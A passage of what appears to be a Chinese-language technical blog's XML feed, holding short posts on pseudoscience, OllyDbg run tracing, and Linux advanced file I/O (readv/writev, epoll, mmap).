rel="noopener">Patch</a></li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>科学和伪科学</title>
      <link href="/2017/12/06/pseudoscience/"/>
      <url>/2017/12/06/pseudoscience/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x5176;&#x5B9E;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x4E00;&#x4E2A;&#x8BBA;&#x8FF0;&#xFF0C;&#x5404;&#x79CD;&#x8BF4;&#x6CD5;&#x4E5F;&#x662F;&#x3002;&#x8981;&#x4E48;&#x5C31;&#x662F;&#x7AD9;&#x5728;&#x8FD9;&#x4E2A;&#x7406;&#x8BBA;&#xFF0C;&#x8981;&#x4E48;&#x5C31;&#x662F;&#x7AD9;&#x5728;&#x90A3;&#x4E2A;&#x9AD8;&#x5EA6;&#x4E0A;&#xFF0C;&#x611F;&#x89C9;&#x8FD8;&#x662F;&#x8BF4;&#x5F97;&#x592A;&#x865A;&#x3001;&#x592A;&#x626F;&#x4E86;&#x3002;<br>&#x6700;&#x8FD1;&#x770B;&#x4E86;&#x4E00;&#x4E2A;&#x63CF;&#x8FF0;&#xFF0C;&#x611F;&#x89C9;&#x5F88;&#x4E0D;&#x9519;&#xFF0C;&#x6709;&#x4E00;&#x79CD;&#x770B;&#x7740;&#x5C31;&#x89C9;&#x5F97;&#x5F88;&#x6709;&#x9053;&#x7406;&#xFF0C;&#x5C31;&#x662F;&#x90A3;&#x79CD;&#x611F;&#x89C9;&#x662F;&#x6709;&#x9053;&#x7406;&#xFF0C;&#x4F46;&#x662F;&#x5374;&#x8BF4;&#x4E0D;&#x6E05;&#x695A;&#x3002;&#x3002;&#x3002;</p><h3 id="&#x5982;&#x4F55;&#x5224;&#x65AD;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x662F;&#x4E0D;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#xFF1F;"><a href="#&#x5982;&#x4F55;&#x5224;&#x65AD;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x662F;&#x4E0D;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#xFF1F;" class="headerlink" title="&#x5982;&#x4F55;&#x5224;&#x65AD;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x662F;&#x4E0D;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#xFF1F;"></a>&#x5982;&#x4F55;&#x5224;&#x65AD;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x662F;&#x4E0D;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#xFF1F;</h3><p>&#x5982;&#x679C;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x7684;&#x4FE1;&#x4EF0;&#x8005;&#x5728;&#x5FC3;&#x91CC;&#x8BBE;&#x5B9A;&#x4E00;&#x4E9B;&#x89C4;&#x5219;&#xFF0C;&#x8BA4;&#x4E3A;&#x5982;&#x679C;&#x8FD9;&#x4E9B;&#x89C4;&#x5219;&#x88AB;&#x7834;&#x574F;&#xFF0C;&#x5C31;&#x4F1A;&#x8BA4;&#x4E3A;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#xFF0C;&#x90A3;&#x4E48;&#x9A6C;&#x514B;&#x601D;&#x4E3B;&#x4E49;&#x5C31;&#x662F;&#x79D1;&#x5B66;&#x7684;&#xFF1B;&#x5426;&#x5219;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x4F2A;&#x79D1;&#x5B66;&#x4E86;&#x3002;</p><h3 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h3><p><a href="http://mp.weixin.qq.com/s/fK6QGNWR8tTjG9twOewDkQ" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/fK6QGNWR8tTjG9twOewDkQ</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 随便看看 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> science </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ollydbg run trace</title>
      <link href="/2017/11/27/ollydbg-run-trace/"/>
      <url>/2017/11/27/ollydbg-run-trace/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>&#x4F7F;&#x7528;run trace&#x8DDF;&#x8E2A;&#x4EE3;&#x7801;&#x6267;&#x884C;&#xFF0C;&#x7528;&#x4E8E;&#x53BB;&#x9664;&#x82B1;&#x6307;&#x4EE4;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x6DF7;&#x6DC6;</p><ol><li>&#x6253;&#x5F00;run trace </li><li>&#x8BBE;&#x7F6E;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E; &#x548C; &#x7ED3;&#x675F;&#x4F4D;&#x7F6E; &#x65AD;&#x70B9;</li><li>&#x6267;&#x884C; &#x8DDF;&#x8E2A;&#x6B65;&#x5165; &#x6216; &#x8DDF;&#x8E2A;&#x6B65;&#x8FC7;</li><li>&#x67E5;&#x770B; run trace&#x89C6;&#x56FE;&#xFF0C;&#x5219;&#x4E3A;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x8BED;&#x53E5;&#x4EE3;&#x7801;</li></ol><p>&#x4F7F;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x5F88;&#x591A;&#x7684;&#x4EE3;&#x7801;&#x4E2D; &#x76F4;&#x63A5;&#x63D0;&#x53D6;&#x51FA;&#x8BE5;&#x6761;&#x4EF6;&#x4E0B;&#x6240;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;&#x3002;</p><p>&#x53C2;&#x8003;&#xFF1A;<br><a href="http://blog.csdn.net/liujiayu2/article/details/56940831" target="_blank" rel="noopener">http://blog.csdn.net/liujiayu2/article/details/56940831</a></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> ollydbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 系统编程导读 - 高级文件I/O</title>
      <link href="/2017/10/09/Linux-System-Programming-3/"/>
      <url>/2017/10/09/Linux-System-Programming-3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="&#x6563;&#x5E03;-&#x805A;&#x96C6;-I-O"><a href="#&#x6563;&#x5E03;-&#x805A;&#x96C6;-I-O" class="headerlink" title="&#x6563;&#x5E03;/&#x805A;&#x96C6; I/O"></a>&#x6563;&#x5E03;/&#x805A;&#x96C6; I/O</h3><p>&#x76EE;&#x7684;&#x662F;&#x5728;&#x5355;&#x6B21;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#xFF08;I/O&#x64CD;&#x4F5C;&#xFF09;&#x4E2D;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x3002;&#x6309;&#x6211;&#x4EEC;&#x5E73;&#x65F6;&#x7684;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;** read ** &#x4EE5;&#x53CA; ** write *<em>&#xFF0C;&#x90FD;&#x662F;&#x5C06;&#x6570;&#x636E;&#x8BFB;&#x5165;&#x5355;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x4ECE;&#x5355;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x4E2D;&#x5199;&#x51FA;&#x3002;<br>&#x540C;&#x6837;&#x4E5F;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x63A5;&#x53E3;&#xFF1A;<br></em></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">readv</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> struct iovec *iov, <span class="hljs-keyword">int</span> count)</span></span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">writev</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> struct iovec *iov, <span class="hljs-keyword">int</span> count)</span></span>;</span><br></pre></td></tr></tbody></table></figure><em><br>&#x90FD;&#x5305;&#x542B;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;fd&#x662F;&#x9700;&#x8981;&#x64CD;&#x4F5C;&#x7684;&#x6587;&#x4EF6;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F;iovec&#x7ED3;&#x6784;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x5373;&#x7F13;&#x51B2;&#x533A;&#xFF0C;&#x7B2C;&#x4E09;&#x4E2A;&#x6307;&#x793A;&#x6570;&#x91CF;&#x3002;<br>iovec&#x7ED3;&#x6784;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> {</span></span><br><span class="line"><span class="hljs-keyword">void</span> *iov_base;</span><br><span class="line"><span class="hljs-keyword">size_t</span> iov_len;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><br>&#x7528;&#x57FA;&#x5740;&#x548C;&#x957F;&#x5EA6;&#x6765;&#x63CF;&#x8FF0;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x3002;&#x8BFB;&#x5165;&#x7684;&#x6570;&#x636E;&#x5C06;&#x653E;&#x5165;iov_base~iov_base+iov_len&#x8FD9;&#x7247;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x4E2D;&#x3002;<br>segment&#x7528;&#x6765;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x3002;<br>*</em> &#x8BFB;&#x64CD;&#x4F5C; *<em>&#xFF1A;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x5165;count&#x4E2A;segment&#x5230; iov&#x6307;&#x5411;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x7EC4;&#x4E2D;&#x3002;<br>*</em> &#x5199;&#x64CD;&#x4F5C; **&#xFF1B;&#x4ECE;iov&#x6307;&#x5411;&#x7684;&#x7F13;&#x51B2;&#x533A;&#x6570;&#x7EC4;&#x4E2D;&#x8BFB;&#x53D6;count&#x4E2A;segment&#x5199;&#x5165;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;<br>&#x8FD4;&#x56DE;&#x503C;&#xFF1A;&#x8BFB;&#x5199;&#x7684;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x5C06;&#x8FD4;&#x56DE;count&#x4E2A;segment&#x7684;&#x6240;&#x6709;iov_len&#x4E4B;&#x548C;<p></p><h3 id="EPOLL"><a href="#EPOLL" class="headerlink" title="EPOLL"></a>EPOLL</h3><p>EPOLL&#x8FD8;&#x662F;&#x7528;&#x4E8E;&#x5728;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E2D;&#x540C;&#x65F6;&#x76D1;&#x63A7;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x76F8;&#x5173;&#x7684;&#x4E8B;&#x4EF6;&#xFF0C;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;POLL&#x548C;SELECT&#x7684;&#x4F18;&#x5316;&#x3002;&#x6700;&#x5927;&#x7684;&#x4F18;&#x52BF;&#x5C31;&#x662F;&#x5728;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x540E;&#x80FD;&#x591F;&#x77E5;&#x9053;&#x662F;&#x4E0E;&#x54EA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x76F8;&#x5173;&#x7684;&#x4E8B;&#x4EF6;&#xFF0C;&#x800C;POLL&#x5C06;&#x9700;&#x8981;&#x904D;&#x5386;&#x4E00;&#x6B21;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x624D;&#x80FD;&#x786E;&#x5B9A;&#x662F;&#x5BF9;&#x54EA;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x6548;&#x7387;&#x5F88;&#x4F4E;&#x3002;<br>&#x4E0B;&#x9762;&#x662F;&#x5173;&#x4E8E;EPOLL&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p><h4 id="&#x521B;&#x5EFA;EPOLL"><a href="#&#x521B;&#x5EFA;EPOLL" class="headerlink" title="&#x521B;&#x5EFA;EPOLL"></a>&#x521B;&#x5EFA;EPOLL</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">epoll_create</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span>)</span></span></span><br></pre></td></tr></tbody></table></figure><br>size&#x4EC5;&#x4E3A;&#x901A;&#x77E5;&#x5185;&#x6838;&#x9700;&#x8981;&#x76D1;&#x542C;&#x7684;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E2A;&#x6570;&#xFF0C;&#x5E76;&#x4E0D;&#x4EE3;&#x8868;&#x662F;&#x6700;&#x5927;&#x503C;&#x3002;<p></p><h4 id="&#x63A7;&#x5236;EPOLL"><a href="#&#x63A7;&#x5236;EPOLL" class="headerlink" title="&#x63A7;&#x5236;EPOLL"></a>&#x63A7;&#x5236;EPOLL</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">epoll_ctl</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> epfd, <span class="hljs-keyword">int</span> op, <span class="hljs-keyword">int</span> fd, struct epoll_event *event)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br><strong>* epoll_ctl *</strong>&#x7528;&#x4E8E;&#x63A7;&#x5236;EPOLL&#x5B9E;&#x4F8B;&#x52A0;&#x5165;&#x6216;&#x8005;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x53C2;&#x6570;op&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EPOLL_CTL_ADD&#xFF1A;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x64CD;&#x4F5C;</span><br><span class="line">EPOLL_CTL_DEL&#xFF1A;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x64CD;&#x4F5C;</span><br><span class="line">EPOLL_CTL_MOD&#xFF1A;&#x4FEE;&#x6539;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x4E0A;&#x76D1;&#x542C;&#x7684;&#x4E8B;&#x4EF6;</span><br></pre></td></tr></tbody></table></figure><br>&#x6307;&#x5B9A;&#x9700;&#x8981;&#x76D1;&#x542C;&#x7684;&#x4E8B;&#x4EF6;&#xFF0C;epoll_event&#xFF1B;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> {</span></span><br><span class="line">__u32 events; <span class="hljs-comment">/* events */</span></span><br><span class="line"><span class="hljs-keyword">union</span> {</span><br><span class="line"><span class="hljs-keyword">void</span> *ptr;</span><br><span class="line"><span class="hljs-keyword">int</span> fd;</span><br><span class="line">__u32 u32;</span><br><span class="line">__u64 u64;</span><br><span class="line">} data;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><br>events&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x4E86;&#x9700;&#x8981;&#x5BF9;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x76D1;&#x542C;&#x7684;&#x4E8B;&#x4EF6;&#x3002;<br>&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6765;&#x81EA;&#x4E66;&#x4E0A;&#xFF1A;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">epoll_event</span> <span class="hljs-title">event</span>;</span></span><br><span class="line"><span class="hljs-keyword">int</span> ret;</span><br><span class="line">event.data.fd = fd; <span class="hljs-comment">/* return the fd to us later</span></span><br><span class="line"><span class="hljs-comment">*/</span></span><br><span class="line">event.events = EPOLLIN | EPOLLOUT;</span><br><span class="line">ret = epoll_ctl (epfd, EPOLL_CTL_ADD, fd, &amp;event);</span><br><span class="line"><span class="hljs-keyword">if</span> (ret)</span><br><span class="line">perror (&#x201D;epoll_ctl&#x201D;);</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="&#x7B49;&#x5F85;EPOLL&#x4E8B;&#x4EF6;"><a href="#&#x7B49;&#x5F85;EPOLL&#x4E8B;&#x4EF6;" class="headerlink" title="&#x7B49;&#x5F85;EPOLL&#x4E8B;&#x4EF6;"></a>&#x7B49;&#x5F85;EPOLL&#x4E8B;&#x4EF6;</h4><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">epoll_wait</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> epfd, struct epoll_event *events, <span class="hljs-keyword">int</span> maxevents, <span class="hljs-keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br><strong>* epoll_wait *</strong>&#x7528;&#x4E8E;&#x7B49;&#x5F85;EPOLL&#x5B9E;&#x4F8B;epfd&#x4E2D;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x6240;&#x5305;&#x542B;&#x7684;&#x4E8B;&#x4EF6;&#xFF0C;&#x65F6;&#x9650;&#x4E3A;timeout&#x6BEB;&#x79D2;&#xFF08;&#x82E5;timeout=0&#xFF0C;&#x5219;&#x7ACB;&#x523B;&#x8FD4;&#x56DE;&#xFF1B;timeout=-1&#x5219;&#x4E00;&#x76F4;&#x7B49;&#x5F85;&#xFF09;&#x3002;<br>&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x65F6;&#xFF0C;events&#x6307;&#x5411;&#x5305;&#x542B;epoll_event&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5B58;&#x3002;<br>&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1&#x3002;<p></p><h4 id="&#x8FB9;&#x6CBF;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x548C;&#x6C34;&#x5E73;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;"><a href="#&#x8FB9;&#x6CBF;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x548C;&#x6C34;&#x5E73;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;" class="headerlink" title="&#x8FB9;&#x6CBF;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x548C;&#x6C34;&#x5E73;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;"></a>&#x8FB9;&#x6CBF;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x548C;&#x6C34;&#x5E73;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;</h4><p>&#x6C34;&#x5E73;&#x89E6;&#x53D1;&#xFF1A;&#x9ED8;&#x8BA4;&#x9009;&#x9879;&#xFF0C;&#x5728;&#x72B6;&#x6001;&#x53D1;&#x751F;&#x65F6;&#x89E6;&#x53D1;&#x3002;<br>&#x8FB9;&#x6CBF;&#x89E6;&#x53D1;&#xFF1A;&#x8BBE;&#x7F6E;events&#x9879;&#x4E3A;EPOLLE&#xFF0C;&#x5728;&#x72B6;&#x6001;&#x6539;&#x53D8;&#x65F6;&#x89E6;&#x53D1;&#x3002;</p><h3 id="&#x5B58;&#x50A8;&#x6620;&#x5C04;"><a href="#&#x5B58;&#x50A8;&#x6620;&#x5C04;" class="headerlink" title="&#x5B58;&#x50A8;&#x6620;&#x5C04;"></a>&#x5B58;&#x50A8;&#x6620;&#x5C04;</h3><p>&#x5C06;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E0E;&#x5185;&#x5B58;&#x8FDB;&#x884C;&#x6620;&#x5C04;&#xFF0C;&#x4F7F;&#x5F97;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#x548C;&#x8BBF;&#x95EE;&#x5185;&#x5B58;&#x4E00;&#x81F4;&#x3002;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">mmap</span> <span class="hljs-params">(<span class="hljs-keyword">void</span> *addr, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">int</span> prot, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br><strong>* mmap *</strong> &#x7528;&#x4E8E;&#x5C06;&#x6587;&#x4EF6;fd&#x4ECE;offset&#x504F;&#x79FB;&#x5F80;&#x540E; len&#x4E2A;&#x5B57;&#x8282;&#x5185;&#x5BB9;&#x6620;&#x5C04;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x3002;prot&#x6307;&#x793A;&#x5185;&#x5B58;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002;flags&#x6307;&#x793A;&#x6620;&#x5C04;&#x7684;&#x4E00;&#x4E9B;&#x884C;&#x4E3A;&#x3002;<br>&#x5F53;&#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x5176;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x4F1A;&#x52A0;1&#xFF0C;&#x5373;&#x6620;&#x5C04;&#x540E;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#x4ECD;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x6587;&#x4EF6;&#xFF1B;&#x5F53;&#x53D6;&#x6D88;&#x6620;&#x5C04;&#x540E;&#xFF0C;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x4F1A;&#x51CF;1<br>&#x8C03;&#x7528;&#x6210;&#x529F;&#xFF0C;&#x8FD4;&#x56DE;&#x6620;&#x5C04;&#x533A;&#x7684;&#x5730;&#x5740;<br>&#x8C03;&#x7528;&#x5931;&#x8D25;&#xFF0C;&#x8FD4;&#x56DE;MAP_FAILED<p></p><h4 id="&#x4E24;&#x4E2A;&#x4FE1;&#x53F7;"><a href="#&#x4E24;&#x4E2A;&#x4FE1;&#x53F7;" class="headerlink" title="&#x4E24;&#x4E2A;&#x4FE1;&#x53F7;"></a>&#x4E24;&#x4E2A;&#x4FE1;&#x53F7;</h4><p>SIGBUS&#xFF0C;&#x5F53;&#x5C1D;&#x8BD5;&#x8BBF;&#x95EE;&#x4E00;&#x5757;&#x65E0;&#x6548;&#x7684;&#x6620;&#x5C04;&#x533A;&#x57DF;&#x65F6;&#x89E6;&#x53D1;<br>SIGSEGV&#xFF0C;&#x5F53;&#x5C1D;&#x8BD5;&#x5199;&#x4E00;&#x5757;&#x53EA;&#x8BFB;&#x533A;&#x57DF;&#x65F6;&#x89E6;&#x53D1;</p><h4 id="&#x9875;&#x5927;&#x5C0F;"><a href="#&#x9875;&#x5927;&#x5C0F;" class="headerlink" title="&#x9875;&#x5927;&#x5C0F;"></a>&#x9875;&#x5927;&#x5C0F;</h4><p>&#x9875;&#x662F;&#x5185;&#x5B58;&#x4E2D;&#x5141;&#x8BB8;&#x4E0D;&#x540C;&#x6743;&#x9650;&#x548C;&#x884C;&#x4E3A;&#x64CD;&#x4F5C;&#x7684;&#x6700;&#x5C0F;&#x5355;&#x5143;&#x3002;<br>&#x9875;&#x662F;&#x5185;&#x5B58;&#x6620;&#x5C04;&#x7684;&#x57FA;&#x672C;&#x5757;&#xFF0C;&#x4E5F;&#x662F;&#x8FDB;&#x7A0B;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x57FA;&#x672C;&#x5757;&#x3002;<br>&#x56E0;&#x6B64; mmap &#x6620;&#x5C04;&#x5BF9;&#x5E94;&#x7684;addr&#x548C;len&#x90FD;&#x9700;&#x6309;&#x9875;&#x5BF9;&#x9F50;&#xFF0C;&#x5373;&#x9875;&#x7684;&#x6574;&#x6570;&#x500D;&#xFF0C;&#x5BF9;&#x4E8E;&#x591A;&#x4F59;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7528;0&#x586B;&#x5145;&#x3002;<br>&#x51E0;&#x79CD;&#x83B7;&#x53D6;&#x9875;&#x5927;&#x5C0F;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;<br><strong>* sysconf *</strong> POSIX&#x6807;&#x51C6;&#x63A5;&#x53E3;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">sysconf</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">long</span> page_size = sysconf (_SC_PAGESIZE);</span><br></pre></td></tr></tbody></table></figure><br><strong>* getpagesize *</strong> Linux&#x63D0;&#x4F9B;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;unix&#x7CFB;&#x7EDF;&#x90FD;&#x652F;&#x6301;&#x3002;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpagesize</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><br><strong>* PAGE_SIZE *</strong> &#x5B8F;&#x5B9A;&#x4E49;<br><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">int</span> page_size= PAGE_SIZE ;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h4><p><strong>* munmap *</strong>&#x7528;&#x4E8E;&#x53D6;&#x6D88;&#x6620;&#x5C04;<br></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span 